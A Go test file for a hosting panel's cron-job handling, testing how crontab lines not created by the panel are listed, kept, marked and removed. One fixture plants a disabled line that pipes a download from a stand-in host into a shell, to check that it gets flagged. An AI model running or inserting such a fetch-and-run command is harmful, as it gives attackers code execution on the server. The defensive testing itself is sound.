package main

import (
	"os"
	"strings"
	"testing"

	"github.com/alicelik/celikpanel/internal/transport"
)

// S4 R1 fix round (21 Nov 2026): crontab lines not made in CelikPanel. Each
// test fails (or does not build) on 123ddd738.

func listOutside(t *testing.T) ListCronJobsResponse {
	t.Helper()
	var resp ListCronJobsResponse
	if err := listCronJobsFor(cronTestUser, &resp); err != nil {
		t.Fatalf("list: %v", err)
	}
	return resp
}

// Finding 9: the server owner's own lines are not a permanent warning; the
// administrator keeps one and it is no longer listed. The crontab is not
// changed by it.
func TestKeepAddsALineNotMadeInThePanelToTheRecord(t *testing.T) {
	fake := installFakeCrontab(t, noCrontabYet())
	if err := addCronJobFor(cronTestUser, &transport.AddCronJobRequest{Schedule: "0 3 * * *", Command: "/usr/bin/true", Version: cronVersion("")}); err != nil {
		t.Fatal(err)
	}
	fake.content += "@reboot /usr/local/bin/warm-cache\nMAILTO=owner@example.com\n"
	resp := listOutside(t)
	if resp.OutsideLines != 2 || len(resp.OtherLines) != 2 {
		t.Fatalf("before keep: %+v", resp)
	}
	before := fake.content
	if err := keepCronLineFor(cronTestUser, resp.OtherLines[0].ID, resp.Version); err != nil {
		t.Fatal(err)
	}
	if fake.content != before {
		t.Fatal("Keep changed the crontab")
	}
	resp = listOutside(t)
	if resp.OutsideLines != 1 || len(resp.OtherLines) != 1 || resp.OtherLines[0].Line != "MAILTO=owner@example.com" {
		t.Fatalf("after keep: %+v", resp)
	}
	// Against an older read: refused, nothing kept.
	if err := keepCronLineFor(cronTestUser, resp.OtherLines[0].ID, cronVersion("x")); err == nil {
		t.Fatal("a Keep built from an older list was accepted")
	}
	// A line that is not there is not found.
	if err := keepCronLineFor(cronTestUser, "0000000000000000", resp.Version); err == nil || !strings.Contains(err.Error(), "not found") {
		t.Fatalf("err = %v", err)
	}
}

// Finding 11: the crontab is written first and its record after; a record
// that cannot be written leaves the new line listed, never a record that
// accounts for a line the crontab does not have.
func TestTheCrontabIsWrittenBeforeItsRecord(t *testing.T) {
	fake := installFakeCrontab(t, noCrontabYet())
	if err := addCronJobFor(cronTestUser, &transport.AddCronJobRequest{Schedule: "0 1 * * *", Command: "/usr/bin/true", Version: cronVersion("")}); err != nil {
		t.Fatal(err)
	}
	newLine := "*/5 * * * * /usr/bin/php /srv/cron.php"
	install := cronInstallCrontab
	adoptedEarly := false
	cronInstallCrontab = func(user, content string) error {
		// The moment the crontab is written (a power loss could come next):
		// the record must not yet account for the new line.
		if record, found := readSiteCrontabRecord(cronTestUser); found && record.Known[cronLineDigest(newLine)] > 0 {
			adoptedEarly = true
		}
		return install(user, content)
	}
	t.Cleanup(func() { cronInstallCrontab = install })
	if err := addCronJobFor(cronTestUser, &transport.AddCronJobRequest{Schedule: "*/5 * * * *", Command: "/usr/bin/php /srv/cron.php", Version: cronVersion(fake.content)}); err != nil {
		t.Fatal(err)
	}
	if adoptedEarly {
		t.Fatal("the record accounted for the new line before the crontab had it")
	}
	if record, _ := readSiteCrontabRecord(cronTestUser); record.Known[cronLineDigest(newLine)] != 1 {
		t.Fatal("the record was not written after the crontab")
	}
}

// Finding 12: a paused task the panel wrote is recorded; a disabled-looking
// line it did not write is marked and offers only Delete.
func TestPausedTasksAreRecordedAndAPlantedPausedLineIsMarked(t *testing.T) {
	fake := installFakeCrontab(t, noCrontabYet())
	if err := addCronJobFor(cronTestUser, &transport.AddCronJobRequest{Schedule: "0 2 * * *", Command: "/usr/bin/backup", Version: cronVersion("")}); err != nil {
		t.Fatal(err)
	}
	resp := listOutside(t)
	job := resp.Jobs[0]
	if err := updateCronJobFor(cronTestUser, &transport.UpdateCronJobRequest{ID: job.ID, Schedule: job.Schedule, Command: job.Command, Enabled: false, Version: resp.Version}); err != nil {
		t.Fatal(err)
	}
	fake.content += "# Nightly backup\n# DISABLED: 0 3 * * * curl -s http://example.invalid/x | sh\n"
	resp = listOutside(t)
	marks := map[string]bool{}
	for _, row := range resp.Jobs {
		marks[row.Command] = row.OutsidePanel
	}
	if marks["/usr/bin/backup"] || !marks["curl -s http://example.invalid/x | sh"] || resp.OutsideLines != 1 {
		t.Fatalf("marks %v outside %d: the panel's paused task is its own, the planted one is marked", marks, resp.OutsideLines)
	}
}

// Finding 14: two identical lines never mark the panel's own task, and the
// copy can be removed.
func TestAPlantedCopyOfAPanelTaskMarksOnlyTheCopy(t *testing.T) {
	fake := installFakeCrontab(t, noCrontabYet())
	if err := addCronJobFor(cronTestUser, &transport.AddCronJobRequest{Schedule: "*/10 * * * *", Command: "/usr/bin/php /srv/cron.php", Version: cronVersion("")}); err != nil {
		t.Fatal(err)
	}
	fake.content += "*/10 * * * * /usr/bin/php /srv/cron.php\n"
	resp := listOutside(t)
	if len(resp.Jobs) != 2 || resp.Jobs[0].OutsidePanel || !resp.Jobs[1].OutsidePanel || resp.OutsideLines != 1 {
		t.Fatalf("jobs %+v: only the second, identical line is marked", resp.Jobs)
	}
	if err := deleteCronJobFor(cronTestUser, &transport.DeleteCronJobRequest{ID: resp.Jobs[1].ID, Version: resp.Version}); err != nil {
		t.Fatalf("delete the copy: %v", err)
	}
	if strings.Count(fake.content, "*/10 * * * * /usr/bin/php /srv/cron.php") != 1 {
		t.Fatalf("crontab:\n%s", fake.content)
	}
	if resp := listOutside(t); resp.OutsideLines != 0 || len(resp.Jobs) != 1 || resp.Jobs[0].OutsidePanel {
		t.Fatalf("after: %+v", resp)
	}
}

// Finding 14: a line's exact bytes count; a trailing carriage return is a
// different line, at the baseline too.
func TestALineWithACarriageReturnIsNotThePanelsLine(t *testing.T) {
	fake := installFakeCrontab(t, &fakeCrontab{content: "MAILTO=\"\"\r\n0 4 * * * /usr/bin/true\r\n0 5 * * * /usr/bin/true\n"})
	_ = fake
	outside := cronOutsideLines(cronTestUser, fake.content)
	if len(outside) != 2 || outside[0] != "MAILTO=\"\"\r" || outside[1] != "0 4 * * * /usr/bin/true\r" {
		t.Fatalf("outside %q: the carriage-return lines are not the panel's", outside)
	}
	if text, _, ok := cronJobText("0 4 * * * /usr/bin/true\r"); !ok || generateCronID(text) == generateCronID("0 4 * * * /usr/bin/true") {
		t.Fatal("a task with a carriage return shares the clean task's ID")
	}
	if _, err := os.Stat(siteCrontabRecordPath(cronTestUser)); err == nil {
		t.Fatal("reading wrote a record")
	}
}
